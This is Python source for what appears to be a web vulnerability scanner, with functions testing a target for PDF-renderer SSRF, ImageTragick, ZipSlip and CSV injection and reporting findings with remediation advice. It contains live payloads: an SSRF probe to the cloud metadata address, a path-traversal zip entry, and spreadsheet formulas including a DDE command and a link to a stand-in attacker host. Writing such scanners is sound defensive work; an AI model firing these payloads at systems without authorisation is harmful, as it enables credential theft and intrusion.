"""Server-side processing scanners: PDF generation SSRF, ImageTragick, ZipSlip, CSV injection, SSRF via image processing."""
import io, zipfile, httpx
from typing import Optional
from mantis.core.findings import Finding, Severity, EvidenceLevel, FindingSource


async def scan_pdf_generation_ssrf(http, url, param, callback_url=None):
    """PDF generation SSRF — inject HTML with internal URL that gets fetched during rendering."""
    if not callback_url:
        callback_url = "http://169.254.169.254/latest/meta-data/"
    payload = f'<iframe src="{callback_url}"></iframe><img src="{callback_url}">'
    try:
        r = await http.get(url, params={param: payload}, timeout=15)
        ct = r.headers.get("content-type", "")
        if "pdf" in ct.lower() or r.content[:4] == b"%PDF":
            # PDF generated — check for SSRF indicators
            content_str = r.content.decode(errors="replace")
            indicators = ["169.254.169.254", "ami-id", "instance-id", "iam"]
            if any(ind in content_str for ind in indicators):
                return Finding(
                    title=f"PDF Generation SSRF in '{param}'",
                    description="HTML injected into PDF generator fetches arbitrary URLs (SSRF via headless browser).",
                    source=FindingSource.WEBAPP, severity=Severity.HIGH,
                    evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                    target=url, endpoint=url, vuln_type="PDF Generation SSRF",
                    cwe="CWE-918", payload=payload, confidence=0.85, tags=["pdf_ssrf", "ssrf"],
                    impact="Access internal services, cloud metadata, port scanning via PDF renderer.",
                    remediation="Sanitize HTML before PDF rendering. Block file://, internal IPs in renderer config.",
                )
            return Finding(
                title=f"Potential PDF Generation SSRF in '{param}' (needs OOB)",
                description="Endpoint generates PDF from user HTML. Use OOB callback to confirm SSRF.",
                source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.SUSPICION,
                target=url, endpoint=url, vuln_type="PDF Generation SSRF",
                cwe="CWE-918", confidence=0.4, tags=["pdf_ssrf", "needs_oob"],
                impact="If renderer fetches user URLs, leads to SSRF.",
                remediation="Sanitize HTML, disable JavaScript/external resources in renderer.",
            )
    except Exception: pass
    return None


async def scan_imagetragick(http, url):
    """ImageTragick (CVE-2016-3714) and modern image library RCE via crafted images."""
    # Craft minimal MVG file that triggers ImageMagick command execution
    mvg_payload = b'''push graphic-context
viewbox 0 0 640 480
fill 'url(https://mantis-imagetragick-test.invalid/test)'
pop graphic-context'''
    try:
        files = {"file": ("test.mvg", mvg_payload, "image/x-mvg")}
        r = await http.post(url, files=files, timeout=15)
        if r.status_code < 400:
            return Finding(
                title=f"Potential ImageTragick at {url}",
                description="Endpoint accepted MVG file upload — vulnerable to ImageTragick if processed by ImageMagick.",
                source=FindingSource.WEBAPP, severity=Severity.HIGH,
                evidence_level=EvidenceLevel.SUSPICION,
                target=url, endpoint=url, vuln_type="ImageTragick",
                cwe="CWE-78", payload="MVG file", confidence=0.5, tags=["imagetragick"],
                impact="Remote code execution via crafted image processing.",
                remediation="Update ImageMagick. Disable URL/MVG/MSL/PS coders in policy.xml.",
            )
    except Exception: pass
    return None


async def scan_zipslip(http, url):
    """ZipSlip — path traversal during archive extraction."""
    # Create malicious zip with path traversal entry
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr("../../../tmp/mantis_zipslip_test.txt", "mantis_zipslip_marker")
    zip_buf.seek(0)

    try:
        files = {"file": ("evil.zip", zip_buf.read(), "application/zip")}
        r = await http.post(url, files=files, timeout=15)
        if r.status_code < 400 and ("upload" in r.text.lower() or "success" in r.text.lower()):
            return Finding(
                title=f"Potential ZipSlip at {url}",
                description="Endpoint accepted ZIP with path traversal entries. Manual verification required.",
                source=FindingSource.WEBAPP, severity=Severity.HIGH,
                evidence_level=EvidenceLevel.SUSPICION,
                target=url, endpoint=url, vuln_type="ZipSlip",
                cwe="CWE-22", confidence=0.5, tags=["zipslip"],
                impact="Path traversal during ZIP extraction — overwrite arbitrary files, RCE.",
                remediation="Validate extracted file paths. Reject entries with '../' or absolute paths.",
            )
    except Exception: pass
    return None


async def scan_csv_injection(http, url, param):
    """CSV injection — formulas injected into exported spreadsheets."""
    payloads = [
        "=cmd|'/c calc'!A1",
        "=HYPERLINK(\"http://attacker.invalid\",\"Click me\")",
        "@SUM(1+1)",
        "+1+1",
    ]
    try:
        # Look for export endpoints
        if "export" in url.lower() or "download" in url.lower() or ".csv" in url.lower():
            for payload in payloads:
                # Submit data that should appear in export
                await http.post(url.replace("export", "create").replace("download", "create"),
                                 data={param: payload}, timeout=10)
            # Fetch export
            r = await http.get(url, timeout=10)
            for payload in payloads:
                if payload in r.text:
                    return Finding(
                        title=f"CSV Injection via '{param}' at {url}",
                        description=f"User input is exported to CSV without formula escaping. Payload '{payload}' present in export.",
                        source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                        evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                        target=url, endpoint=url, vuln_type="CSV Injection",
                        cwe="CWE-1236", payload=payload, confidence=0.85, tags=["csv_injection"],
                        impact="Formulas execute when victim opens CSV in Excel/LibreOffice — RCE via DDE.",
                        remediation="Prefix cells starting with =, +, -, @ with a single quote. Sanitize CSV exports.",
                    )
    except Exception: pass
    return None
